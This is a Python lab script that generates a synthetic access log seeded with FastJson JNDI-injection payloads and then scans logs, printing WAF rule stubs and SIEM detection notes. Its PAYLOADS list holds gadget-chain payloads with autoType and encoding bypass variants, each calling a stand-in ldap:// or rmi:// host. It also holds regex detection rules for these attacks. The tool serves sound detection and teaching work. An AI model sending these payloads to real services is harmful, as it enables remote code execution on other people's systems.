"""
FastJson RCE Exploitation Lab

Generates a synthetic HTTP access log seeded with FastJson JNDI-injection payloads,
then scans any plain-text log for the same patterns, emitting WAF rule stubs and
SIEM detection notes alongside each finding.

Usage:
    python fastjson_rce_lab.py                        # lab + scan sandbox
    python fastjson_rce_lab.py access.log             # lab + scan both
    python fastjson_rce_lab.py access.log --mode scan
    python fastjson_rce_lab.py --mode lab
    python fastjson_rce_lab.py access.log --severity high
"""
import argparse
import re
import sys

PAYLOADS = [
    ('{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.example.com:1389/Exploit","autoCommit":true}',
     "@type-JNDI", "high", "CVE-2017-18349", "Bare @type JdbcRowSetImpl JNDI-ldap gadget chain"),
    ('{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://attacker.example.com:1099/Exploit","autoCommit":true}',
     "@type-JNDI", "high", "CVE-2017-18349", "Bare @type JdbcRowSetImpl JNDI-rmi gadget chain"),
    ('{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"ldap://attacker.example.com:1389/x"}',
     "GadgetChain", "high", "CVE-2017-18349", "JNDIConfiguration gadget chain via ldap"),
    ('{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://attacker.example.com:1389/x"}',
     "GadgetChain", "high", "CVE-2022-25845", "HikariConfig gadget chain — CVE-2022-25845 autoType bypass"),
    ('{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://attacker.example.com:1389/x"}',
     "GadgetChain", "high", "CVE-2022-25845", "JndiObjectFactory gadget chain"),
    ('{"\u0040type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.example.com:1389/BP","autoCommit":true}',
     "UnicodeBP", "high", "CVE-2017-18349", "Unicode \\u0040 bypass for @ in @type key"),
    ('{"\\u0040type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.example.com:1389/BP2","autoCommit":true}',
     "UnicodeBP", "high", "CVE-2017-18349", "JSON-escaped \\u0040 unicode bypass variant"),
    ('{"%40type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.example.com:1389/URL","autoCommit":true}',
     "UnicodeBP", "high", "CVE-2017-18349", "URL-encoded %40 bypass for @type key"),
    ('{"@type":"[com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.example.com:1389/arr","autoCommit":true}',
     "AutoTypeBP", "high", "CVE-2022-25845", "Array prefix [ autoType whitelist escape"),
    ('{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://attacker.example.com:1389/ref","autoCommit":true}',
     "AutoTypeBP", "high", "CVE-2022-25845", "Reference prefix L...;  autoType whitelist escape"),
    ('{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://attacker.example.com:1389/x"}}',
     "GadgetChain", "high", "CVE-2022-25845", "JndiDataSourceFactory gadget — alternate JNDI sink"),
    ('{"name":"safe","data":{"@type":"java.lang.String","val":"hello"}}',
     None, "low", None, "Benign nested @type for polymorphic deserialization (expected false-positive candidate)"),
]

RULES = [
    ("@type-JNDI", "high",
     re.compile(r'@type["\s]*:["\s]*(com\.sun\.rowset|com\.zaxxer|org\.apache)[^"]*["\s,}].*(?:jndi:|ldap://|rmi://)', re.I | re.S),
     'SecRule REQUEST_BODY "@rx (?i)@type.*(?:jndi:|ldap://|rmi://)" "id:9001,phase:2,deny,status:403,msg:\'FastJson JNDI @type\'"',
     'condition: keywords|contains(http_request_body, \'@type\') and keywords|contains(http_request_body, \'jndi:\')'),
    ("GadgetChain", "high",
     re.compile(r'@type["\s]*:["\s]*["\[]?L?(?:com\.sun\.rowset\.JdbcRowSetImpl|org\.apache\.commons\.configuration\.JNDIConfiguration|com\.zaxxer\.hikari\.HikariConfig|org\.apache\.shiro\.jndi\.JndiObjectFactory|org\.apache\.ibatis\.datasource\.jndi\.JndiDataSourceFactory)', re.I),
     'SecRule REQUEST_BODY "@rx (?i)@type.*(?:JdbcRowSetImpl|JNDIConfiguration|HikariConfig|JndiObjectFactory|JndiDataSourceFactory)" "id:9002,phase:2,deny,status:403,msg:\'FastJson gadget class\'"',
     'condition: re.search(r\'JdbcRowSetImpl|JNDIConfiguration|HikariConfig|JndiObjectFactory|JndiDataSourceFactory\', http_request_body)'),
    ("UnicodeBP", "high",
     re.compile(r'(?:\\u0040|%40)type', re.I),
     'SecRule REQUEST_BODY "@rx (?i)(?:\\\\u0040|%40)type" "id:9003,phase:2,deny,status:403,msg:\'FastJson unicode/URL @-bypass\'"',
     'condition: re.search(r\'(?i)(?:\\\\u0040|%40)type\', http_request_body)'),
    ("AutoTypeBP", "high",
     re.compile(r'@type["\s]*:["\s]*(?:\[|L)[a-z][\w$.]+;?', re.I),
     'SecRule REQUEST_BODY "@rx (?i)@type[\"\\s]*:[\"\\s]*(?:\\[|L)[a-zA-Z]" "id:9004,phase:2,deny,status:403,msg:\'FastJson autoType whitelist escape\'"',
     'condition: re.search(r\'(?i)@type[\\\"\\s]*:[\\\"\\s]*(?:\\[|L)\', http_request_body)'),
]

SEVERITY_RANK = {"low": 0, "medium": 1, "high": 2}


def build_lab():
    lines = []
    for i, (payload, tag, sev, cve, legend) in enumerate(PAYLOADS, 1):
        label = f"[{cve or 'BENIGN'}][{tag or 'none'}] {legend}" if tag else f"[BENIGN] {legend}"
        encoded = payload.replace('"', '\\"')
        line = f'10.0.0.{i} - - [28/Jul/2026:12:00:{i:02d} +0000] "POST /api/v1/data HTTP/1.1" 200 512 "-" "curl/7.88" body="{encoded}"'
        lines.append((line, label))
    return lines


def scan_logs(lines):
    for line in lines:
        for technique, severity, pattern, waf_stub, siem_note in RULES:
            if pattern.search(line):
                snippet = (line[:120] + "...") if len(line) > 120 else line
                yield technique, severity, snippet, waf_stub, siem_note
                break


def report(findings, min_severity):
    counts = {}
    peak = "low"
    total = 0
    for technique, severity, snippet, waf_stub, siem_note in findings:
        if SEVERITY_RANK[severity] < SEVERITY_RANK[min_severity]:
            continue
        counts[technique] = counts.get(technique, 0) + 1
        if SEVERITY_RANK[severity] > SEVERITY_RANK[peak]:
            peak = severity
        total += 1
        print(f"\n[ALERT][{severity.upper()}][{technique}]")
        print(f"  Snippet : {snippet}")
        print(f"  WAF     : {waf_stub}")
        print(f"  SIEM    : {siem_note}")
    print(f"\n--- Tally (min_severity={min_severity}) ---")
    for tech, cnt in sorted(counts.items()):
        print(f"  {tech}: {cnt} hit(s)")
    print(f"  Total: {total} | Peak severity: {peak.upper()}")
    return peak == "high" and total > 0


def main():
    parser = argparse.ArgumentParser(description="FastJson RCE Exploitation Lab")
    parser.add_argument("log_file", nargs="?", help="Path to plain-text HTTP/app log to scan")
    parser.add_argument("--mode", choices=["lab", "scan", "both"], default="both")
    parser.add_argument("--severity", choices=["low", "medium", "high"], default="low")
    args = parser.parse_args()

    lab_lines = []
    if args.mode in ("lab", "both"):
        print("=== Lab Phase: Synthetic FastJson Attack Log ===\n")
        lab_entries = build_lab()
        for line, label in lab_entries:
            print(f"LEGEND: {label}")
            print(line)
            print()
            lab_lines.append(line)

    if args.mode in ("scan", "both"):
        print("=== Scan Phase ===")
        lines_to_scan = []
        if args.log_file:
            try:
                with open(args.log_file, "r", errors="replace") as fh:
                    lines_to_scan.extend(fh.readlines())
            except OSError as exc:
                print(f"[ERROR] Cannot read {args.log_file}: {exc}", file=sys.stderr)
                sys.exit(2)
        if lab_lines:
            lines_to_scan.extend(lab_lines)
        if not lines_to_scan:
            print("[WARN] No log lines to scan.", file=sys.stderr)
            sys.exit(0)
        high_found = report(scan_logs(lines_to_scan), args.severity)
        if high_found:
            sys.exit(1)


if __name__ == "__main__":
    main()